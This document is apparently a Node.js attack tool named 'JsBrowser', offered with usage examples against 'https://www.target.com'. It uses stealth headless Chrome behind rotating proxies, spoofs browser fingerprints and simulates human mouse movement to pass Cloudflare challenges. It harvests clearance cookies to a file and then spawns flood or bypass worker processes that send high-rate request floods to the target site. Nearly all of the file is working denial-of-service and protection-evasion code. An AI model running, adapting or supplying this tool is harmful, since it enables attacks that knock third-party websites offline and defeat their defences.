const fs = require("fs");
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
const { spawn, exec } = require("child_process");
const cluster = require("cluster");
const colors = require("colors");
const chalk = require('chalk');
const { Semaphore } = require('async-mutex');

process.on("uncaughtException", function (error) {});
process.on("unhandledRejection", function (error) {});
process.setMaxListeners(0);

if (process.argv.length < 8) {
    console.clear();
    console.log(`
      ${colors.white.bold(`JsBrowser`)} - Fast Solver Bypass Captcha/UAM Cloudflare
      ${colors.green.bold(`Contact`)}: t.me/bixd08

      ${colors.magenta.bold(`USAGE`)}:
          node em.js Target Time ThreadBrowser ThreadFlood Rate ProxyFile

      ${colors.magenta.bold(`OPTIONS`)}:
          --debug true/false - Show browser logs (default: false)
          --flooder true/false - Enable flood process (default: false)
          --bypass true/false - Use bypass.js instead of flood.js (default: false)

      ${colors.magenta.bold(`EXAMPLE`)}:
          node em.js https://www.target.com 250 4 12 64 proxy.txt
          node em.js https://www.target.com 250 2 8 32 proxy.txt --debug true --flooder true
          node em.js https://www.target.com 250 3 10 48 proxy.txt --debug true --bypass true


`);
    process.exit(0);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3]);
const browserThreads = parseInt(process.argv[4]);
const floodThreads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);
const proxyFile = process.argv[7];

// Parse options
let debug = false;
let flooderEnabled = false;
let bypassMode = false;

for (let i = 8; i < process.argv.length; i++) {
    if (process.argv[i] === '--debug') {
        if (i + 1 < process.argv.length && (process.argv[i + 1] === 'true' || process.argv[i + 1] === 'false')) {
            debug = process.argv[i + 1] === 'true';
            i++;
        } else {
            debug = true;
        }
    } else if (process.argv[i] === '--flooder') {
        if (i + 1 < process.argv.length && (process.argv[i + 1] === 'true' || process.argv[i + 1] === 'false')) {
            flooderEnabled = process.argv[i + 1] === 'true';
            i++;
        } else {
            flooderEnabled = true;
        }
    } else if (process.argv[i] === '--bypass') {
        if (i + 1 < process.argv.length && (process.argv[i + 1] === 'true' || process.argv[i + 1] === 'false')) {
            bypassMode = process.argv[i + 1] === 'true';
            i++;
        } else {
            bypassMode = true;
        }
    }
}

// Utility functions
function colored(colorCode, text) {
    console.log(colorCode + text + "\x1b[0m");
}

// DANH SÁCH USER-AGENT THỰC TẾ
const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0'
];

const mobileUserAgents = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0'
];

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function getRandomUserAgent(isMobile = false) {
    if (isMobile) {
        return randomElement(mobileUserAgents);
    }
    return randomElement(userAgents);
}

const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));

// Stealth plugin
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);

// Load proxies
const readProxiesFromFile = (filePath) => {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        const proxies = data.trim().split(/\r?\n/).filter(proxy => {
            const regex = /^[\w\.-]+:\d+$/;
            return regex.test(proxy);
        });
        return proxies;
    } catch (error) {
        console.error('Error file proxy:', error);
        return [];
    }
};

const allProxies = readProxiesFromFile(proxyFile);
const flooders = [];
let cookieCount = 0;
let successfulProxies = new Set();
let cookiesQueue = [];

// Semaphore để giới hạn số trình duyệt chạy đồng thời
const maxConcurrentBrowsers = browserThreads;
const browserSemaphore = new Semaphore(maxConcurrentBrowsers);

// Function để chia danh sách proxy cho worker
function distributeProxies(workerId, totalWorkers, proxies) {
    const proxiesPerWorker = Math.ceil(proxies.length / totalWorkers);
    const startIndex = workerId * proxiesPerWorker;
    const endIndex = Math.min(startIndex + proxiesPerWorker, proxies.length);
    return proxies.slice(startIndex, endIndex);
}

// Functions để simulate human behavior (giữ nguyên)
async function simulateHumanMouseMovement(page, element, options = {}) {
    const { minMoves = 5, maxMoves = 10, minDelay = 50, maxDelay = 150, jitterFactor = 0.1, overshootChance = 0.2, hesitationChance = 0.1, finalDelay = 500 } = options;
    const bbox = await element.boundingBox();
    if (!bbox) throw new Error('Element not visible');
    const targetX = bbox.x + bbox.width / 2;
    const targetY = bbox.y + bbox.height / 2;
    const pageDimensions = await page.evaluate(() => ({ width: window.innerWidth, height: window.innerHeight }));
    let currentX = Math.random() * pageDimensions.width;
    let currentY = Math.random() * pageDimensions.height;
    const moves = Math.floor(Math.random() * (maxMoves - minMoves + 1)) + minMoves;
    
    for (let i = 0; i < moves; i++) {
        const progress = i / (moves - 1);
        let nextX = currentX + (targetX - currentX) * progress;
        let nextY = currentY + (targetY - currentY) * progress;
        nextX += (Math.random() * 2 - 1) * jitterFactor * bbox.width;
        nextY += (Math.random() * 2 - 1) * jitterFactor * bbox.height;
        
        if (Math.random() < overshootChance && i < moves - 1) {
            nextX += (Math.random() * 0.5 + 0.5) * (nextX - currentX);
            nextY += (Math.random() * 0.5 + 0.5) * (nextY - currentY);
        }
        
        await page.mouse.move(nextX, nextY, { steps: 10 });
        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
        await new Promise(resolve => setTimeout(resolve, delay));
        
        if (Math.random() < hesitationChance) {
            await new Promise(resolve => setTimeout(resolve, delay * 3));
        }
        
        currentX = nextX;
        currentY = nextY;
    }
    
    await page.mouse.move(targetX, targetY, { steps: 5 });
    await new Promise(resolve => setTimeout(resolve, finalDelay));
}

async function simulateNaturalPageBehavior(page) {
    const dimensions = await page.evaluate(() => {
        return { width: document.documentElement.clientWidth, height: document.documentElement.clientHeight, scrollHeight: document.documentElement.scrollHeight };
    });
    
    const scrollAmount = Math.floor(dimensions.scrollHeight * (0.2 + Math.random() * 0.6));
    
    const scrollSteps = 8 + Math.floor(Math.random() * 8);
    const scrollStepSize = scrollAmount / scrollSteps;
    
    for (let i = 0; i < scrollSteps; i++) {
        await page.evaluate((step) => {
            window.scrollBy(0, step);
        }, scrollStepSize);
        await sleep(0.05 + Math.random() * 0.2);
    }
    
    await sleep(1 + Math.random() * 3);
    
    const movementCount = 2 + Math.floor(Math.random() * 4);
    for (let i = 0; i < movementCount; i++) {
        const x = Math.floor(Math.random() * dimensions.width * 0.8) + dimensions.width * 0.1;
        const y = Math.floor(Math.random() * dimensions.height * 0.8) + dimensions.height * 0.1;
        await page.mouse.move(x, y, { steps: 10 + Math.floor(Math.random() * 20) });
        await sleep(0.5 + Math.random() * 1);
    }
    
    if (Math.random() > 0.5) {
        for (let i = 0; i < scrollSteps / 2; i++) {
            await page.evaluate((step) => {
                window.scrollBy(0, -step);
            }, scrollStepSize);
            await sleep(0.05 + Math.random() * 0.2);
        }
    }
}

async function spoofFingerprint(page, userAgent) {
    const isMobile = userAgent.toLowerCase().includes('mobile') || 
                    userAgent.toLowerCase().includes('android') || 
                    userAgent.toLowerCase().includes('iphone') || 
                    userAgent.toLowerCase().includes('ipad');
    
    await page.evaluateOnNewDocument((ua, mobile) => {
        Object.defineProperty(navigator, 'userAgent', {
            get: () => ua
        });
        
        let platform = 'Win32';
        if (ua.includes('Macintosh')) platform = 'MacIntel';
        if (ua.includes('Linux')) platform = 'Linux x86_64';
        if (ua.includes('Android')) platform = 'Linux armv8l';
        if (ua.includes('iPhone')) platform = 'iPhone';
        
        Object.defineProperty(navigator, 'platform', {
            get: () => platform
        });
        
        if (mobile) {
            Object.defineProperty(window, 'screen', {
                value: {
                    width: 360,
                    height: 640,
                    availWidth: 360,
                    availHeight: 640,
                    colorDepth: 24,
                    pixelDepth: 24,
                    orientation: { type: 'portrait-primary' }
                }
            });
        } else {
            Object.defineProperty(window, 'screen', {
                value: {
                    width: 1920,
                    height: 1080,
                    availWidth: 1920,
                    availHeight: 1040,
                    colorDepth: 24,
                    pixelDepth: 24
                }
            });
        }
        
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) {
                return 'Intel Inc.';
            }
            if (parameter === 37446) {
                return 'Intel Iris OpenGL Engine';
            }
            return getParameter.apply(this, arguments);
        };
        
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false
        });
        
        Object.defineProperty(navigator, 'language', {
            get: () => 'en-US'
        });
        
        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en']
        });
        
        Object.defineProperty(navigator, 'hardwareConcurrency', {
            value: mobile ? 4 : 8
        });
        
        if ('deviceMemory' in navigator) {
            Object.defineProperty(navigator, 'deviceMemory', {
                value: mobile ? 4 : 8
            });
        }
        
        if (mobile) {
            Object.defineProperty(navigator, 'maxTouchPoints', {
                value: 5
            });
        }
        
        if (window.chrome) {
            Object.defineProperty(window.chrome, 'runtime', {
                value: {}
            });
        }
        
        Object.defineProperty(navigator, 'plugins', {
            value: []
        });
        
        if ('connection' in navigator) {
            Object.defineProperty(navigator.connection, 'rtt', {
                value: 100
            });
            Object.defineProperty(navigator.connection, 'downlink', {
                value: 10
            });
            Object.defineProperty(navigator.connection, 'effectiveType', {
                value: '4g'
            });
        }
        
    }, userAgent, isMobile);
}

// Solving captcha logic
async function solvingCaptcha(page, browserProxy) {
    try {
        const title = await page.title();
        const content = await page.content();
        
        if (title === "Attention Required! | Cloudflare") {
            if (debug) colored("\x1b[31m", "[JsBrowser] Blocked by Cloudflare.");
            return false;
        }
        
        if (content.includes("challenge-platform") || content.includes("cloudflare.challenges.com") || title === "Just a moment...") {
            if (debug) {
                console.log(`➝ Start chrome run with addressProxy: ${colors.magenta(`${browserProxy}`)}`);
            }
            
            await sleep(Math.floor(Math.random() * 8) + 4);
            
            const cookies = await page.cookies();
            const hasCfChlRcMCookie = cookies.some(cookie => cookie.name === "cf_chl_rc_m");
            
            if (hasCfChlRcMCookie && debug) {
                console.log(`➝ Start chrome run with addressProxy: ${colors.magenta(`${browserProxy}`)}`);
                await sleep(5);
            }

            const captchaContainer = await page.$("body > div.main-wrapper > div > div > div > div");
            if (captchaContainer) {
                await simulateHumanMouseMovement(page, captchaContainer, {
                    minMoves: 6, maxMoves: 15, minDelay: 30, maxDelay: 120, finalDelay: 700, jitterFactor: 18, overshootChance: 0.4, hesitationChance: 0.3
                });
                await captchaContainer.click();
                await captchaContainer.click({ offset: { x: 17, y: 20.5 } });
                await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
            }
        }
        
        await sleep(2);
        return true;
    } catch (error) {
        throw error;
    }
}

async function launchBrowserWithRetry(targetURL, browserProxy) {
    const [value, release] = await browserSemaphore.acquire();
    try {
        return await launchBrowserInternal(targetURL, browserProxy);
    } finally {
        release();
    }
}

async function launchBrowserInternal(targetURL, browserProxy) {
    let browser;
    
    const useMobile = Math.random() > 0.5;
    const userAgent = getRandomUserAgent(useMobile);
    
    const options = {
        headless: true,
        args: [
            `--proxy-server=${browserProxy}`,
            `--user-agent=${userAgent}`,
            '--headless=new',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--no-zygote',
            `--window-size=${useMobile ? '360,640' : '1920,1080'}`,
            '--disable-gpu',
            '--disable-accelerated-2d-canvas',
            '--disable-background-timer-throttling',
            '--disable-backgrounding-occluded-windows',
            '--disable-back-forward-cache',
            '--disable-browser-side-navigation',
            '--disable-renderer-backgrounding',
            '--disable-ipc-flooding-protection',
            '--metrics-recording-only',
            '--disable-extensions',
            '--disable-default-apps',
            '--disable-application-cache',
            '--disable-component-extensions-with-background-pages',
            '--disable-client-side-phishing-detection',
            '--disable-popup-blocking',
            '--disable-prompt-on-repost',
            '--disable-Browserbars',
            '--disable-breakpad',
            '--disable-field-trial-config',
            '--disable-background-networking',
            '--disable-search-engine-choice-screen',
            '--ignore-certificate-errors',
            '--ignore-ssl-errors',
            '--tls-min-version=1.2',
            '--tls-max-version=1.3',
            '--ssl-version-min=tls1.2',
            '--ssl-version-max=tls1.3',
            '--enable-quic',
            '--enable-features=PostQuantumKyber',
            '--disable-blink-features=AutomationControlled',
            '--no-first-run',
            '--test-type',
            '--allow-pre-commit-input',
            '--force-color-profile=srgb',
            '--use-mock-keychain',
            '--enable-features=NetworkService,NetworkServiceInProcess',
            '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure,IsolateOrigins,site-per-process'
        ],
        defaultViewport: {
            width: useMobile ? 360 : 1920,
            height: useMobile ? 640 : 1080,
            deviceScaleFactor: useMobile ? 3 : 1,
            isMobile: useMobile,
            hasTouch: useMobile,
            isLandscape: false
        }
    };

    try {
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();
        const client = page._client();
        
        await spoofFingerprint(page, userAgent);

        page.on("framenavigated", (frame) => {
            if (frame.url().includes("challenges.cloudflare.com")) {
                client.send("Target.detachFromTarget", { targetId: frame._id }).catch(() => {});
            }
        });

        page.setDefaultNavigationTimeout(60 * 1000);
        await page.goto(targetURL, { waitUntil: "domcontentloaded" });
        await simulateNaturalPageBehavior(page);

        let captchaAttempts = 0;
        const maxCaptchaAttempts = 4;

        while (captchaAttempts < maxCaptchaAttempts) {
            await solvingCaptcha(page, browserProxy);
            const cookies = await page.cookies(targetURL);
            const shortCookies = cookies.filter(cookie => cookie.value.length < 15);

            if (shortCookies.length === 0) {
                const title = await page.title();
                const cookieString = cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim();
                await browser.close();
                
                return {
                    title: title,
                    browserProxy: browserProxy,
                    cookies: cookieString,
                    userAgent: userAgent,
                    success: true
                };
            }
            
            captchaAttempts++;
        }
        
        await browser.close();
        return { success: false, browserProxy: browserProxy };
        
    } catch (error) {
        if (browser) {
            await browser.close().catch(() => {});
        }
        throw error;
    }
}

// Log function
function log(message, type = "info") {
    const d = new Date();
    const hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    const minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    const seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();
    const time = `${hours}:${minutes}:${seconds}`;
    
    const urlObj = new URL(targetURL);
    const hostname = chalk.gray.bold(urlObj.hostname);
    
    let color;
    let prefix;
    
    switch(type) {
        case "success":
            color = colors.green;
            prefix = "JsBrowser";
            break;
        case "error":
            color = colors.red;
            prefix = "JsBrowser";
            break;
        case "warning":
            color = colors.yellow;
            prefix = "JsBrowser";
            break;
        case "flooder":
            color = colors.cyan;
            prefix = "JsFlooder";
            break;
        case "bypass":
            color = colors.magenta;
            prefix = "JsBypass";
            break;
        default:
            color = colors.white;
            prefix = "JsBrowser";
    }
    
    if (debug || type === "success" || type === "error" || type === "flooder" || type === "bypass") {
        console.log(`(${colors.magenta.bold(prefix)}/${colors.yellow.bold(`BixD`)}) | (${time.cyan}) | (${hostname}) | ${color(message)}`);
    }
}

// Spawn flooder với thread riêng - ĐÃ SỬA THỨ TỰ ARGUMENTS
function spawnFlooder(proxy, ua, cookie, floodThreadId) {
    try {
        const threadRate = Math.floor(rate / floodThreads);
        
        const args = bypassMode ? [
            "bypass.js",                    // 0 - script name
            "GET",                          // 1 - reqmethod (phương thức HTTP)
            targetURL,                      // 2 - target URL
            duration.toString(),            // 3 - thời gian chạy (giây)
            floodThreads.toString(),        // 4 - số thread flood
            threadRate.toString(),          // 5 - rate limit mỗi thread
            proxy,                          // 6 - proxy string "ip:port" hoặc "ip:port:user:pass"
            cookie,                         // 7 - cookies đã thu thập
            ua,                             // 8 - user-agent
            "--query", "1",                 // 9, 10 - tùy chọn query (1, 2, hoặc 3)
            "--debug"                       // 11 - flag debug
        ] : [
            "flood.js",                     // 0 - script name
            targetURL,                      // 1 - target URL
            duration.toString(),            // 2 - thời gian chạy (giây)
            floodThreads.toString(),        // 3 - số thread flood
            proxy,                          // 4 - proxy string "ip:port" hoặc "ip:port:user:pass"
            threadRate.toString(),          // 5 - rate per second mỗi thread
            cookie,                         // 6 - cookies đã thu thập
            ua,                             // 7 - user-agent
            "--debug"                       // 8 - flag debug
        ];
        
        // Thêm --debug vào cuối nếu debug mode được bật
        if (debug) {
            if (bypassMode) {
                args.push("--debug");
            } else {
                // Đối với flood.js, --debug đã có ở vị trí thứ 8
                args[8] = "--debug";
            }
        }
        
        // Debug log để kiểm tra arguments
        if (debug) {
            console.log(`[DEBUG] Spawning ${bypassMode ? 'bypass' : 'flood'} thread ${floodThreadId}`);
            console.log(`[DEBUG] Proxy: ${proxy}`);
            console.log(`[DEBUG] User-Agent: ${ua.substring(0, 50)}...`);
            console.log(`[DEBUG] Cookie: ${cookie.substring(0, 50)}...`);
            console.log(`[DEBUG] Thread Rate: ${threadRate}`);
            console.log(`[DEBUG] Args count: ${args.length}`);
            console.log(`[DEBUG] Args: ${args.join(' ')}`);
        }
        
        const flooderProcess = spawn("node", args);
        flooders.push(flooderProcess);
        
        flooderProcess.stdout.on('data', (data) => {
            const output = data.toString().trim();
            if (output) {
                log(`Thread ${floodThreadId}: ${output}`, bypassMode ? "bypass" : "flooder");
            }
        });
        
        flooderProcess.stderr.on('data', (data) => {
            const error = data.toString().trim();
            if (error && debug) {
                log(`Thread ${floodThreadId} error: ${error}`, "error");
            }
        });
        
        flooderProcess.on('close', (code) => {
            if (debug) {
                log(`Thread ${floodThreadId} exited with code ${code}`, code === 0 ? "success" : "error");
            }
        });
        
        log(`Started ${bypassMode ? 'bypass' : 'flood'} thread ${floodThreadId} with proxy: ${proxy}`, bypassMode ? "bypass" : "flooder");
        return flooderProcess;
        
    } catch (error) {
        log(`Error spawning ${bypassMode ? 'bypass' : 'flood'} thread ${floodThreadId}: ${error.message}`, "error");
        return null;
    }
}

// Worker process cho browser
async function browserWorkerProcess(workerId, totalWorkers) {
    const workerProxies = distributeProxies(workerId, totalWorkers, allProxies);
    
    if (debug) {
        log(`Browser Worker ${workerId} handling ${workerProxies.length} proxies`, "info");
    }
    
    for (let i = 0; i < workerProxies.length; i++) {
        const proxy = workerProxies[i];
        
        if (successfulProxies.has(proxy)) {
            if (debug) log(`Browser Worker ${workerId}: Skipping already successful proxy: ${proxy}`, "warning");
            continue;
        }
        
        try {
            const response = await launchBrowserWithRetry(targetURL, proxy);
            
            if (response && response.success) {
                if (response.title === "Attention Required! | Cloudflare") {
                    log(`Browser Worker ${workerId}: Blocked by Cloudflare on proxy: ${proxy}`, "error");
                    continue;
                }
                
                if (!response.cookies) {
                    log(`Browser Worker ${workerId}: No cookies with proxy: ${proxy}`, "warning");
                    continue;
                }
                
                successfulProxies.add(proxy);
                cookiesQueue.push({
                    proxy: proxy,
                    userAgent: response.userAgent,
                    cookies: response.cookies
                });
                
                if (cluster.isWorker) {
                    process.send({ 
                        type: 'cookieFound', 
                        proxy: proxy, 
                        response: response,
                        workerId: workerId 
                    });
                } else {
                    displayResult(response, proxy, workerId);
                    fs.appendFileSync('cookies.txt', `${proxy} | ${response.userAgent} | ${response.cookies}\n`);
                }
                
                await sleep(1);
            } else {
                log(`Browser Worker ${workerId}: Failed to get cookies from proxy: ${proxy}`, "warning");
            }
            
        } catch (error) {
            log(`Browser Worker ${workerId}: Error with proxy ${proxy}: ${error.message}`, "error");
        }
    }
}

// Worker process cho flood/bypass
async function floodWorkerProcess(workerId, totalWorkers) {
    log(`Flood Worker ${workerId} started, waiting for cookies...`, bypassMode ? "bypass" : "flooder");
    
    let attempts = 0;
    const maxAttempts = 60;
    
    while (cookiesQueue.length === 0 && attempts < maxAttempts) {
        await sleep(1);
        attempts++;
        if (attempts % 10 === 0) {
            log(`Flood Worker ${workerId}: Still waiting for cookies... (${attempts}s)`, "warning");
        }
    }
    
    if (cookiesQueue.length === 0) {
        log(`Flood Worker ${workerId}: No cookies available, exiting`, "error");
        return;
    }
    
    const cookieIndex = workerId % Math.min(cookiesQueue.length, floodThreads);
    const cookieData = cookiesQueue[cookieIndex];
    
    if (cookieData) {
        log(`Flood Worker ${workerId}: Starting with proxy ${cookieData.proxy}`, bypassMode ? "bypass" : "flooder");
        
        // QUAN TRỌNG: Truyền proxy string, không phải filename
        // cookieData.proxy đã là dạng "ip:port" hoặc "ip:port:user:pass"
        spawnFlooder(cookieData.proxy, cookieData.userAgent, cookieData.cookies, workerId);
    } else {
        log(`Flood Worker ${workerId}: No cookie data available`, "error");
    }
    
    // Giữ worker sống cho đến khi timeout
    await new Promise(resolve => {
        setTimeout(resolve, duration * 1000);
    });
}

// Hiển thị kết quả
function displayResult(response, proxy, workerId) {
    cookieCount++;
    
    console.log(`{`);
    console.log(`   ${chalk.black.bold.bgWhite('WorkerID')}: ${colors.cyan(workerId)}`);
    console.log(`   ${chalk.black.bold.bgWhite('pageTitle')}: ${colors.green(response.title)}`);
    console.log(`   ${chalk.black.bold.bgWhite('proxyAddress')}: ${colors.green(proxy)}`);
    console.log(`   ${chalk.black.bold.bgWhite('userAgent')}: ${colors.green(response.userAgent)}`);
    console.log(`   ${chalk.black.bold.bgWhite('cookieFound')}: ${colors.green(response.cookies.substring(0, 50) + '...')}`);
    console.log(`   ${chalk.black.bold.bgWhite('Total_Cookies')}: ${colors.green(cookieCount)}`);
    console.log(`},`);
}

// Cleanup function
function cleanup() {
    log("Time's up! Cleaning up...", "warning");
    
    for (const flooder of flooders) {
        try {
            flooder.kill('SIGKILL');
        } catch (e) {}
    }
    
    exec('pkill -f chrome', (err) => {
        if (err && err.code !== 1) {
            // Ignore errors
        } else {
            log("Successfully killed Chrome processes", "success");
        }
    });
    
    exec('pkill -f "node.*(flood|bypass)"', (err) => {
        if (err && err.code !== 1) {
            // Ignore errors
        } else {
            log("Successfully killed flooder processes", "success");
        }
    });
    
    setTimeout(() => {
        log(`Summary: ${cookieCount} successful cookies from ${successfulProxies.size} proxies`, "success");
        log("Exiting", "success");
        process.exit(0);
    }, 5000);
}

// Main function
async function main() {
    if (allProxies.length === 0) {
        log("No proxies found in file. Exiting.", "error");
        process.exit(1);
    }
    
    log(`Starting with ${allProxies.length} proxies, ${browserThreads} browser threads, ${floodThreads} ${bypassMode ? 'bypass' : 'flood'} threads`, "success");
    
    setTimeout(() => {
        cleanup();
    }, duration * 1000);
    
    if (cluster.isPrimary) {
        const totalWorkers = browserThreads + (flooderEnabled ? floodThreads : 0);
        
        log(`Spawning ${totalWorkers} total worker processes`, "success");
        
        for (let i = 0; i < browserThreads; i++) {
            const worker = cluster.fork({ 
                WORKER_TYPE: 'browser',
                WORKER_ID: i,
                TOTAL_BROWSER_WORKERS: browserThreads
            });
            
            worker.on('message', (msg) => {
                if (msg.type === 'cookieFound') {
                    cookieCount++;
                    
                    cookiesQueue.push({
                        proxy: msg.proxy,
                        userAgent: msg.response.userAgent,
                        cookies: msg.response.cookies
                    });
                    
                    displayResult(msg.response, msg.proxy, msg.workerId);
                    
                    fs.appendFileSync('cookies.txt', `${msg.proxy} | ${msg.response.userAgent} | ${msg.response.cookies}\n`);
                }
            });
        }
        
        if (flooderEnabled) {
            setTimeout(() => {
                log(`Starting ${bypassMode ? 'bypass' : 'flood'} workers after 10s delay...`, bypassMode ? "bypass" : "flooder");
                
                for (let i = 0; i < floodThreads; i++) {
                    cluster.fork({ 
                        WORKER_TYPE: bypassMode ? 'bypass' : 'flood',
                        WORKER_ID: i,
                        TOTAL_FLOOD_WORKERS: floodThreads
                    });
                }
            }, 10000);
        }
        
        cluster.on('exit', (worker, code, signal) => {
            const workerType = worker.process.env.WORKER_TYPE || 'unknown';
            log(`${workerType.charAt(0).toUpperCase() + workerType.slice(1)} worker ${worker.process.pid} died`, "warning");
        });
        
    } else {
        const workerType = process.env.WORKER_TYPE || 'browser';
        const workerId = parseInt(process.env.WORKER_ID || '0');
        
        if (workerType === 'browser') {
            const totalBrowserWorkers = parseInt(process.env.TOTAL_BROWSER_WORKERS || '1');
            await browserWorkerProcess(workerId, totalBrowserWorkers);
        } else if (workerType === 'flood' || workerType === 'bypass') {
            const totalFloodWorkers = parseInt(process.env.TOTAL_FLOOD_WORKERS || '1');
            await floodWorkerProcess(workerId, totalFloodWorkers);
        }
        
        process.exit(0);
    }
}

// Start
main().catch(err => {
    log(`Main function error: ${err.message}`, "error");
    process.exit(1);
});